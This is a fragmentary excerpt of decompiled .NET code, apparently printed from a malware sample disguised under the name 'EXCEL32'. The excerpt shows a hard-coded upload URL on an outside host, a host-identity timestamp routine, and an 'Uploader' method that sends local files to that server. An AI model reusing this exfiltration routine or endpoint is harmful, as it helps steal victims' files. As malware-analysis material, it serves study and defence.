...
namespace EXCEL32
{
	...
	public sealed class Constants
	{
		...
		public const string TARGET_URL3 = "http://www.intermune.se////files////up_docx.php";
...
namespace EXCEL32
{
				...
				while (enumerator.MoveNext())
				{
					...
					if (!(Information.IsDBNull(RuntimeHelpers.GetObjectValue(objectValue4)) || objectValue4 == null))
					{
						...
						for (int i = 0; i <= num; i = checked(i + 1))
						{
							...
							if (!Operators.ConditionalCompareObjectEqual(obj, (object)1, false) && !Operators.ConditionalCompareObjectEqual(obj, (object)2, false) && !Operators.ConditionalCompareObjectEqual(obj, (object)3, false) && !Operators.ConditionalCompareObjectEqual(obj, (object)4, false))
							{
								Operators.ConditionalCompareObjectEqual(obj, (object)7, false);
							}
	...
	internal sealed class Scheduler_and_IP
	{
		...
		public static string Identity_Stamp()
		{
			...
			return text2 + Conversions.ToString(DateAndTime.get_Now()) + " " + TimeZone.CurrentTimeZone.StandardName + " Build Version: 1.0.2";
		}
	...
	internal sealed class Uploader
	{
		public static void htmlUpload(string exportName)
		{
			...
			try
			{
				((ServerComputer)MyProject.Computer).get_Network().UploadFile(exportName, "http://www.intermune.se////files////up_docx.php");
			}
			catch (Exception ex5)
			{
				ProjectData.SetProjectError(ex5);
